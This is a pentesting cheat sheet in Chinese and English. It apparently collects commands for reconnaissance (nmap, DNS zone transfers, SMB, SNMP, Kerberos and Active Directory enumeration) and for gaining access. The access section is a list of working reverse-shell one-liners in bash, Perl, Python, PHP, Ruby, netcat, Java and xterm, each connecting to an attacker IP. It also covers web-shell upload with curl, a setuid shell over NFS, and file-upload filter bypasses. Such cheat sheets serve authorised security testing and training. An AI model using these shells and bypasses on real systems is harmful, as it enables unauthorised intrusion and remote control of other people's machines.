# Pentesting 备忘录
## 情报侦查
### 从nmap里面提取出实时存活的IP
    nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
### 简单的端口扫描
    for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
### DNS lookups, Zone Transfers & Brute-Force
    whois domain.com
    dig {a|txt|ns|mx} domain.com
    dig {a|txt|ns|mx} domain.com @ns1.domain.com
    host -t {a|txt|ns|mx} megacorpone.com
    host -a megacorpone.com
    host -l megacorpone.com ns1.megacorpone.com
    dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
    dnsenum domain.com
    nslookup -> set type=any -> ls -d domain.com
    for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
### Banner 抓取
    nc -v $TARGET 80
    telnet $TARGET 80
    curl -vX $TARGET
### NFS共享
列出NFS导出的共享文件，如果RW和no_root_squash存在，那就直接上传[Sid-Shell](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)执行。
    showmount -e 192.168.110.102
    chown root:root sid-shell; chmod +s sid-shell
### Kerberos User Enumeration
    nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
### HTTP Brute-Force & Vulnerability Scanning
    target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
    target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
    target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
    tee命令用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。
### RPC/NetBios/SMB
    rpcinfo -p $TARGET
    nbtscan $TARGET
    #list shares
    smbclient -L //$TARGET -U ""
    # null session
    rpcclient -U "" $TARGET
    smbclient -L //$TARGET
    enum4linux $TARGET
### SNMP
    # Windows User Accounts
    snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25
    # Windows Running Programs
    snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
    # Windows Hostname
    snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5
    # Windows Share Information
    snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1
    # Windows Share Information
    snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27
    # Windows TCP Ports
    snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3
    # Software Name
    snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2
    # brute-force community strings
    onesixtyone -i snmp-ips.txt -c community.txt
    snmp-check $TARGET
### SMTP
    smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
### Active Directory
提一下，就是那些信息搜集工具都是基于自带的函数进行整理，经典的PowerView，熟悉这些对自己开发工具也有好处。
#### 当前Domain信息
    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
powershell命令自动补全很牛X，因为有些字段很长。  
#### 域信任
    ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
#### 当前林信息
    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
#### 林信任信息
    ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
#### 一个域的所有DC
    nltest /dclist:pentestlab.com
    PS C:\Users\wing> nltest /dclist:pentestlab.com
    获得域“pentestlab.com”中 DC 的列表(从“\\PentestLab-DC.pentestlab.com”中)。
        PentestLab-DC.pentestlab.com [PDC]  [DS] 站点: Default-First-Site-Name
    此命令成功完成
    PS C:\Users\wing>
#### 拿到DC当前的认证信息
    nltest /dsgetdc:offense.local
    此命令成功完成
    PS C:\Users\wing> nltest /dsgetdc:pentestlab.com
               DC: \\PentestLab-DC.pentestlab.com
          地址: \\10.10.0.2
         Dom Guid: 08b4981e-2ef6-4257-9de3-b794c2f504b2
         Dom 名称: pentestlab.com
      林名称: pentestlab.com
     DC 站点名称: Default-First-Site-Name
    我们的站点名称: Default-First-Site-Name
            标志: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8
     DS_9
    此命令成功完成
    PS C:\Users\wing>
#### cmd里面得到信任域信息
    nltest /domain_trusts
    此命令成功完成
    PS C:\Users\wing> nltest /domain_trusts
    域信任的列表:
        0: SAKURAWING sakurawing.com (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined 0x10 )
        1: PENTESTLAB pentestlab.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
    此命令成功完成
    PS C:\Users\wing>
#### 得到用户信息
    nltest /user:"spotless"
#### 得到当前经过身份认证的DC
    set l
#### 获取用户信息
    set u
## 获得访问权限
温故一下反弹shell
### Bash
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
### Perl
    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
### URL-Encoded Perl: Linux
    echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
### Python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
### php
    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &3 2>&3");'
### Ruby
    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
### Netcat without -e #1
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
### Netcat without -e #2
    nc localhost 443 | /bin/sh | nc localhost 444
    telnet localhost 443 | /bin/sh | telnet localhost 444
### Java
    r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat &5 >&5; done"] as String[]); p.waitFor();
### XTerm
    xterm -display 10.0.0.1:1
### JDWP RCE
    print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
### Working with Restricted Shells
    print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
    nice /bin/bash
### Interactive TTY Shells
    /usr/bin/expect sh
    python -c ‘import pty; pty.spawn(“/bin/sh”)’
    # execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk
    python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
### 通过form表单进行文件上传
    # POST file
    curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
    # POST binary data to web form
    curl -F "field=' http://192.168.2.99/shell.php
### Payload生成模式和偏移量
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
### Bypassing File Upload
  * file.php -> file.jpg
  * file.php -> file.php.jpg